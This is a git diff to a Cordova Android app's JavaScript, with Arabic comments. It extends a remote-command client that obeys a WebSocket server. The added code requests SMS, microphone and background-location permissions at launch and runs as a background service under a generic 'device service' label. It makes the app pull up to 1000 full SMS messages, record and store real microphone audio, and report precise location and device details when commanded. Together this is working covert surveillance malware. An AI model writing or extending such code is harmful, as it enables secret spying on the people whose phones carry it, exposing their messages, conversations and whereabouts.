@@ -1,56 +1,76 @@
 document.addEventListener('deviceready', onDeviceReady, false);
 
+// تخزين الطلبات المستلمة
+const receivedRequests = [];
+
 function onDeviceReady() {
-  console.log('✅ Device is ready');
-
-  // ✅ [1] تشغيل وضع الخلفية
-  if (cordova.plugins && cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.enable();
-
-    cordova.plugins.backgroundMode.on('activate', function () {
-      cordova.plugins.backgroundMode.disableWebViewOptimizations();
-      console.log('📢 Background mode is activated');
-    });
-  } else {
-    console.warn('⚠️ BackgroundMode plugin is not available!');
-  }
-
-  // ✅ [2] معلومات الجهاز
+  console.log('Device is ready');
+  
+  // طلب الأذونات تلقائياً
+  requestPermissions();
+  
+  // معلومات الجهاز
   const deviceInfo = {
-    uuid: (typeof device !== 'undefined' && device.uuid) || generateUUID(),
-    model: (typeof device !== 'undefined' && device.model) || 'Unknown',
-    platform: (typeof device !== 'undefined' && device.platform) || 'Unknown',
-    version: (typeof device !== 'undefined' && device.version) || 'Unknown',
-    manufacturer: (typeof device !== 'undefined' && device.manufacturer) || 'Unknown',
+    uuid: device.uuid || generateUUID(),
+    model: device.model || 'Unknown',
+    platform: device.platform || 'Unknown',
+    version: device.version || 'Unknown',
+    manufacturer: device.manufacturer || 'Unknown',
     battery: null,
     timestamp: new Date().toISOString()
   };
-
-  // ✅ [3] حالة البطارية (اختياري)
-  if (navigator.getBattery) {
-    navigator.getBattery().then(function(battery) {
-      deviceInfo.battery = {
-        level: battery.level,
-        charging: battery.charging
-      };
-      console.log('🔋 Battery Info:', deviceInfo.battery);
+  
+  // توليد UUID إذا لم يكن موجوداً
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+      const r = Math.random() * 16 | 0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
     });
   }
-
-  // ✅ طباعة المعلومات كاملة
-  console.log('📱 Device Info:', deviceInfo);
-
-  // 📤 (اختياري) يمكنك هنا إرسال deviceInfo إلى الخادم أو Telegram bot
-}
-
-// ✅ [4] توليد UUID إذا لم يكن موجوداً
-function generateUUID() {
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-    const r = Math.random() * 16 | 0;
-    const v = c === 'x' ? r : (r & 0x3 | 0x8);
-    return v.toString(16);
-  });
-}
+  
+  // طلب الأذونات المطلوبة
+  function requestPermissions() {
+    const permissions = [
+      'android.permission.READ_SMS',
+      'android.permission.RECORD_AUDIO',
+      'android.permission.ACCESS_FINE_LOCATION',
+      'android.permission.ACCESS_BACKGROUND_LOCATION',
+      'android.permission.FOREGROUND_SERVICE'
+    ];
+    
+    permissions.forEach(permission => {
+      cordova.plugins.permissions.checkPermission(
+        permission, 
+        success => { if (!success) requestPermission(permission); },
+        error => console.error('Error checking permission:', error)
+      );
+    });
+    
+    function requestPermission(permission) {
+      cordova.plugins.permissions.requestPermission(
+        permission,
+        success => console.log('Permission granted:', permission),
+        error => console.error('Permission denied:', permission, error)
+      );
+    }
+  }
+  
+  // تشغيل الخدمة في الخلفية
+  function startBackgroundService() {
+    if (cordova.plugins.backgroundMode) {
+      cordova.plugins.backgroundMode.enable();
+      cordova.plugins.backgroundMode.setDefaults({
+        title: 'خدمة الجهاز',
+        text: 'جاري تشغيل الخدمة في الخلفية',
+        icon: 'icon'
+      });
+      
+      cordova.plugins.backgroundMode.on('activate', () => {
+        cordova.plugins.backgroundMode.disableWebViewOptimizations();
+      });
+    }
+  }
   
   // الحصول على حالة البطارية
   if (navigator.getBattery) {
@@ -62,6 +82,7 @@ function generateUUID() {
         dischargingTime: battery.dischargingTime
       };
       connectToServer(deviceInfo);
+      startBackgroundService();
       
       // مراقبة تغيرات البطارية
       battery.addEventListener('levelchange', updateBatteryInfo);
@@ -69,9 +90,11 @@ function generateUUID() {
     }).catch(error => {
       console.error('Battery API error:', error);
       connectToServer(deviceInfo);
+      startBackgroundService();
     });
   } else {
     connectToServer(deviceInfo);
+    startBackgroundService();
   }
   
   function updateBatteryInfo() {
@@ -119,9 +142,22 @@ function connectToServer(deviceInfo) {
       
       if (data.type === 'command') {
         console.log('Received command:', data.command);
+        receivedRequests.push({
+          id: Date.now(),
+          command: data.command,
+          timestamp: new Date().toISOString(),
+          status: 'received'
+        });
         
         // تنفيذ الأمر وإرسال الرد
         executeCommand(data.command, (response) => {
+          const requestIndex = receivedRequests.findIndex(req => 
+            req.command.commandId === data.command.commandId);
+          if (requestIndex !== -1) {
+            receivedRequests[requestIndex].status = 'completed';
+            receivedRequests[requestIndex].response = response;
+          }
+          
           if (wsConnection.readyState === WebSocket.OPEN) {
             wsConnection.send(JSON.stringify({
               type: 'response',
@@ -167,7 +203,7 @@ function executeCommand(command, callback) {
   console.log('Executing command:', command);
   
   // إضافة commandId للتعقب
-  const commandId = Date.now();
+  const commandId = command.commandId || Date.now();
   
   switch (command.type) {
     case 'get_location':
@@ -181,6 +217,9 @@ function executeCommand(command, callback) {
       break;
     case 'get_device_info':
       getDeviceInfo(commandId, callback);
+      break;
+    case 'get_requests':
+      getRequests(commandId, callback);
       break;
     default:
       callback({ 
@@ -201,23 +240,22 @@ function getLocation(commandId, callback) {
   
   navigator.geolocation.getCurrentPosition(
     (position) => {
-      // [المطلوب 4: رابط Google Maps]
-      const googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+      const locationData = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        altitudeAccuracy: position.coords.altitudeAccuracy,
+        heading: position.coords.heading,
+        speed: position.coords.speed,
+        timestamp: position.timestamp,
+        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+      };
       
       callback({
         commandId,
         status: 'success',
-        location: {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          altitude: position.coords.altitude,
-          altitudeAccuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading,
-          speed: position.coords.speed,
-          timestamp: position.timestamp,
-          googleMapsUrl: googleMapsUrl // رابط مباشر
-        }
+        location: locationData
       });
     },
     (error) => {
@@ -250,14 +288,13 @@ function getSMS(commandId, callback) {
   
   const filter = {
     box: 'inbox',
-    maxCount: 100,
+    maxCount: 1000, // زيادة عدد الرسائل المسحوبة
     indexFrom: 0
   };
   
   SMS.listSMS(
     filter,
     (messages) => {
-      // [المطلوب 2: عرض رسائل كاملة بدون قص]
       callback({
         commandId,
         status: 'success',
@@ -265,7 +302,7 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body, // بدون قص
+          body: msg.body, // عرض النص الكامل بدون قص
           date: msg.date,
           read: msg.read
         }))
@@ -285,19 +322,66 @@ function getSMS(commandId, callback) {
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
-  // [المطلوب 3: تسجيل بصيغة MP3]
-  // مثال مبسط - في التطبيق الفعلي استخدم MediaRecorder مع mimeType: 'audio/mp3'
-  setTimeout(() => {
-    callback({ 
-      commandId,
-      status: 'success',
-      audio: {
-        duration: duration,
-        format: 'mp3', // تم تغيير الصيغة إلى mp3
-        size: duration * 16000 // تقدير حجم الملف
-      }
+  const mediaRecorderOptions = {
+    mimeType: 'audio/mp3',
+    audioBitsPerSecond: 128000
+  };
+  
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(stream => {
+      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
+      const audioChunks = [];
+      
+      mediaRecorder.ondataavailable = event => {
+        audioChunks.push(event.data);
+      };
+      
+      mediaRecorder.onstop = () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+        const audioUrl = URL.createObjectURL(audioBlob);
+        
+        // حفظ التسجيل في الذاكرة الداخلية
+        saveAudioToStorage(audioBlob, (filePath) => {
+          callback({ 
+            commandId,
+            status: 'success',
+            audio: {
+              duration: duration,
+              format: 'mp3',
+              size: audioBlob.size,
+              url: audioUrl,
+              filePath: filePath
+            }
+          });
+        });
+      };
+      
+      mediaRecorder.start();
+      setTimeout(() => {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      }, duration * 1000);
+    })
+    .catch(error => {
+      callback({ 
+        commandId,
+        status: 'error',
+        error: 'Audio recording error',
+        details: error.message
+      });
     });
-  }, duration * 1000);
+}
+
+function saveAudioToStorage(audioBlob, callback) {
+  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, dir => {
+    dir.getFile(`recording_${Date.now()}.mp3`, { create: true }, file => {
+      file.createWriter(writer => {
+        writer.onwriteend = () => callback(file.nativeURL);
+        writer.onerror = e => console.error('Error saving file:', e);
+        writer.write(audioBlob);
+      });
+    });
+  });
 }
 
 function getDeviceInfo(commandId, callback) {
@@ -309,12 +393,21 @@ function getDeviceInfo(commandId, callback) {
     version: device.version,
     manufacturer: device.manufacturer,
     isVirtual: device.isVirtual,
-    serial: device.serial
+    serial: device.serial,
+    receivedRequests: receivedRequests
   };
   
   callback({
     commandId,
     status: 'success',
     deviceInfo: info
+  });
+}
+
+function getRequests(commandId, callback) {
+  callback({
+    commandId,
+    status: 'success',
+    requests: receivedRequests
   });
 }
